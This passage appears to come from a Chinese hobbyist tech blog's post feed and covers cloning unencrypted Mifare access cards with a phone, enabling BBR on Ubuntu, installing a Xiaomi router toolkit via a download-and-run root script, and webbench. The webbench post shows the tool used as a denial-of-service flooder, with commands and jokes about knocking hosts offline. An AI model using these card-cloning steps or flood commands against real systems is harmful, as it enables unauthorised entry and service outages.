<p><img  src="https://pic.izhaoo.com/Screenshot_2017-10-13-20-57-00-305_com.geektoy.nf.png"  ><span class="image-caption">环境检测</span></p>
<p>接下来我们看看要模拟的磁卡是不是未加密的IC卡。</p>
<p>打开“MifareClassicTool(MCT)”，不需要给Root权限。将手机贴上去，然后“映射密匙到扇区”处勾俩个勾。</p>
<p><img  src="https://pic.izhaoo.com/Screenshot_2017-10-13-20-52-43-866_de.syss.Mifare.png"  ><span class="image-caption">打俩个勾</span></p>
<p>再点击读取，等一会儿。（贴着不放）然后看看扇区有没有加密。如果没有密钥发现(或死扇区)则为加密卡片，放弃吧孩纸。没的加密的话，恭喜咯，我们继续。</p>
<p><img  src="https://pic.izhaoo.com/Screenshot_2017-10-13-20-49-34-265_de.syss.Mifare.png"  ><span class="image-caption">未加密</span></p>
<h3 id="模拟"><a href="#模拟" class="headerlink" title="模拟"></a>模拟</h3><p>打开“NFC Emulator”，给予Root权限。将磁卡贴上去，弹出新建，起个名字就OK了。到此，NFC模拟磁卡完成。</p>
<p><img  src="https://pic.izhaoo.com/Screenshot_2017-10-13-20-59-35-266_com.yuanwofei..png"  ><span class="image-caption">起个名字</span></p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>用的时候只要将“NFC Emulator”打开，点击“模拟”，再亲一亲读卡器就好了。不出意外的话，大门就打开咯。如果身边有妹纸，不出意外的话，不会有事情发生。</p>
<p><img  src="https://pic.izhaoo.com/Screenshot_2017-10-13-20-59-42-933_com.yuanwofei..png"  ><span class="image-caption">使用NFC模拟卡</span></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>hack</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu开启BBR加速</title>
    <url>/2017/09/27/ubuntu-install-bbr/</url>
    <content><![CDATA[<p>Ubuntu升级内核，开启BBR网络加速。</p>
<span id="more"></span>

<h1 id="BBR"><a href="#BBR" class="headerlink" title="BBR"></a>BBR</h1><p>BBR是谷歌最近研发的一项技术，拥塞控制算法。原理是尽量跑满带宽, 并且尽量不要有排队的情况。可以比喻为你家马桶堵了，找根搅屎棍给他通了，屎冲的不就快了。<del>（谷歌别揍我，我是个粗人，想不到好的比喻）</del></p>
<p>在最新内核的Linux系统上你默认配备BBR技术的。所以我们只需给老版本的系统升级最新内核，然后开启BBR即可。</p>
<p>我的服务器是运行在阿里云上的Ubuntu 14.04。另外，据说采用OpenVZ虚拟技术的VPS不适合开启BBR，BUG多。</p>
<h1 id="升级Ubuntu内核"><a href="#升级Ubuntu内核" class="headerlink" title="升级Ubuntu内核"></a>升级Ubuntu内核</h1><p>查看当前内核：</p>
<pre><code class="bash">uname -r</code></pre>
<p>如果返回结果 &lt;= 4.9 的话，说明我们需要升级内核了。</p>
<p>查看系统是32位还是64位：</p>
<pre><code class="bash">arch</code></pre>
<p>我这是64位，待会儿有用。</p>
<p><img  src="https://pic.izhaoo.com/20170927215315.jpg"  ><span class="image-caption">查看系统版本</span></p>
<p>访问<a href="http://kernel.ubuntu.com/~kernel-ppa/mainline/">Ubuntu内核网址</a> ，向下拉找到最新发行版，不推荐RC发行候选版哦，点击进入。</p>
<p><img  src="https://pic.izhaoo.com/20170927215720.jpg"  ><span class="image-caption">内核网址</span></p>
<p>然后根据你的系统版本找到内核下载地址。</p>
<p><img  src="https://pic.izhaoo.com/20170927220209.jpg"  ><span class="image-caption">下载地址</span></p>
<p>下载内核：</p>
<pre><code class="bash">wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.13/linux-image-4.13.0-041300-generic_4.13.0-041300.201709031731_amd64.deb</code></pre>
<p><img  src="https://pic.izhaoo.com/20170927220631.jpg"  ><span class="image-caption">下载内核</span></p>
<p>安装内核：</p>
<pre><code class="bash">dpkg -i linux-image-4.13.0-041300-generic_4.13.0-041300.201709031731_amd64.deb</code></pre>
<p><img  src="https://pic.izhaoo.com/20170927220809.jpg"  ><span class="image-caption">安装内核</span></p>
<p>重启查看下内核：</p>
<pre><code class="bash">shutdown -r now

uname -r</code></pre>
<p>看到内核版本是最新了（&gt; 4.9），就可以开启BBR加速了。</p>
<p><img  src="https://pic.izhaoo.com/20170927221102.jpg"  ><span class="image-caption">最新内核</span></p>
<h1 id="开启BBR"><a href="#开启BBR" class="headerlink" title="开启BBR"></a>开启BBR</h1><pre><code class="bash">echo &quot;net.core.default_qdisc=fq&quot; &gt;&gt; /etc/sysctl.conf

echo &quot;net.ipv4.tcp_congestion_control=bbr&quot; &gt;&gt; /etc/sysctl.conf

sysctl -p</code></pre>
<p>查看是否生效：</p>
<pre><code class="bash">sysctl net.ipv4.tcp_available_congestion_control</code></pre>
<p>若返回“net.ipv4.tcp_available_congestion_control = bbr cubic reno”说明成功了。</p>
<p><img  src="https://pic.izhaoo.com/20170927221352.jpg"  ><span class="image-caption">开启BBR</span></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>小米路由器3 - MT工具箱</title>
    <url>/2017/09/27/mi-router-3-install-misstar-tools/</url>
    <content><![CDATA[<p>给小米路由器3安装MisstarTools工具箱，第三方插件集合。</p>
<span id="more"></span>

<h3 id="MT工具箱"><a href="#MT工具箱" class="headerlink" title="MT工具箱"></a>MT工具箱</h3><p>小米路由器官方插件太少太low了，感觉一个都用不上。那么我为什么选择小米呢？首先是它性价比高，100+大洋配128MB闪存的路由器很不错了。再一个就是它的可玩性好，能折腾出许多花样。小白级别的做个DDNS，低级的安装第三方插件，中级的安装SSH插件，高级的刷第三方固件，骨灰级的改硬件……本篇讲的“MT工具箱”属于中级的SSH插件。</p>
<p>“MT工具箱”其实就是个图形化第三方插件集合，功能都挺实用的。比如其中的“Koolproxy广告过滤”、“Frp内网穿透”、“Aria2”就很不错，“VPN服务器”呢略显过时，要是配个“ss服务器”就好了。（插件官方的解释是“由于不可描述的原因暂时下架”，大家都懂得噢，脑补）</p>
<p><img  src="https://pic.izhaoo.com/20170927114825.jpg"  ><span class="image-caption">MT工具箱</span></p>
<h3 id="开启SSH"><a href="#开启SSH" class="headerlink" title="开启SSH"></a>开启SSH</h3><p>所谓SSH插件，就是要先开启SSH连接之后才能安装的咯。（汗，什么解释）现在小米路由器官方是开放SSH的。（大赞）</p>
<p>我们先去<a href="https://d.miwifi.com/rom/ssh">SSH开启页面</a>申请开放SSH。登陆你的小米帐号，注意路由器绑定的也要是这个帐号。点击“下载工具包”，然后用U盘刷入路由器吧。具体的可以看网页下面的步骤，写的很详细。（其实是我懒得码字了）root密码记下来，等会儿连接SSH要用到的。</p>
<p><img  src="https://pic.izhaoo.com/20170927121736.jpg"  ><span class="image-caption">SSH页面</span></p>
<p>刷完SSH工具包之后就可以连接SSH了。首要要下载个SSH连接器。</p>
<p>以下二选一吧 –&gt; <a href="http://www.netsarang.com/products/xsh_overview.html">Xshell</a>  <a href="http://www.putty.org/">Putty</a></p>
<p>然后打开SSH连接器，我这儿是Xshell，新建，然后输入小米路由器IP地址，一般是“192.168.31.1”。</p>
<p><img  src="https://pic.izhaoo.com/20170927122252.jpg"  ><span class="image-caption">新建</span></p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>然后连接SSH，会提示你输入帐号和密码，帐号是“root”，密码就是刚网页上的那个。连接成功后会显示以下界面，“xiaoqiang”，小米脑洞好大。<del>（可能是他们觉得小米路由器想小强一样刷不死吧，我可不认同，我另一只小米路由器3就是刷了华硕老毛子固件没备份breed再也回不来了。）</del></p>
<p><img  src="https://pic.izhaoo.com/20170927122427.jpg"  ><span class="image-caption">小强？！</span></p>
<p>然后输入：</p>
<pre><code class="bash">wget http://www.misstar.com/tools/appstore/install.sh -O /tmp/install.sh &amp;&amp; chmod +x /tmp/install.sh &amp;&amp; /tmp/install.sh</code></pre>
<p>安装脚本会自动下载MT工具箱并安装。安装过程中会提示你路由器版本，小米路由器三就选“R3”即可。安装完成后刷新路由器页面就好了。然后添加你喜欢的工具即可。</p>
<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p><a href="http://www.miui.com/thread-7520321-1-2.html">&lt;小米论坛&gt;Misstar Tools工具箱2.0{8-30新增R3G支持}</a></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>路由器</tag>
      </tags>
  </entry>
  <entry>
    <title>webbench</title>
    <url>/2017/02/03/webbench/</url>
    <content><![CDATA[<p>昨天网站被人DDOS了三次，阿里云资源耗尽关了我三次站。追踪了下，是个江苏的IP<code>180.97.106.xx</code>，对方用的工具是webbench。那我们就来研究下webbench这玩意儿吧。</p>
<span id="more"></span>

<p><a href="https://pan.baidu.com/s/1mifmQ0K">webbench 1.5</a></p>
<p><img  src="https://pic.izhaoo.com/2017022415560741.jpg"  ><span class="image-caption">1</span></p>
<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>Webbench是款网站压力测试工具，美其名曰压力测试，其实嘛你懂得。webbench不但能对静态页面测试，还能对动态页面（ASP,PHP,JAVA,CGI）进 行测试。还有就是他支持对含有SSL的安全网站进行静态或动态的性能测试。下图我们可以看到，它已经很久没更新了。</p>
<p><img  src="https://pic.izhaoo.com/2017022415560711.jpg"  ><span class="image-caption">2</span></p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>webbench是用c语言编写的，所以理论上支持绝大多数平台。这里我们用黑客专用系统–kali2.0–做个范例。</p>
<pre><code class="bash">apt-get install ctags   // 安装依赖环境

wget http://home.tiscali.cz/~cz210552/distfiles/webbench-1.5.tar.gz     // 下载程序及编译

make

make install</code></pre>
<p>至此，webbench就安装完毕了。</p>
<p><img  src="https://pic.izhaoo.com/2017022415560814.jpg"  ><span class="image-caption">3</span></p>
<h3 id="压测"><a href="#压测" class="headerlink" title="压测"></a>压测</h3><pre><code class="bash">webbench -c 并发数量 -t 持续时间 测试的URL

webbench -c 500 -t 30 http://leme2014.top/ //测试首页，index.php动态页面

webbench -c 500 -t 30 http://leme2014.top/test.html //测试html静态页面

webbench -c 500 -t 30 http://leme2014.top/test.jpg //测试jpg文件
</code></pre>
<p>可以看到加载圈转个不停，这时候其他人就无法访问此站了。对于一些虚拟主机，并发大了，系统就会资源耗尽关站，像万网一个月只能开三次，你打他个四五下就好玩了。</p>
<p><img  src="https://pic.izhaoo.com/2017022415560858.jpg"  ><span class="image-caption">4</span></p>
<h3 id="防治"><a href="#防治" class="headerlink" title="防治"></a>防治</h3><p>有攻必有防，防治cc攻击可以从以下方面着手。1.全站静态化，挂CDN。这样流量就全转到CDN去了。前提别泄漏真实IP哦。2.购买一些防cc产品，比如高防IP、流量稀释包等产品。3.对于cc防护其实还是容易的，毕竟只有一个IP嘛，我们把攻击IP或IP段添加到黑名单即可。4.暂时关会儿站吧。攻击是最好的防御，有能力就打回去，捣了对方窝点。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>hack</tag>
      </tags>
  </entry>
</search>
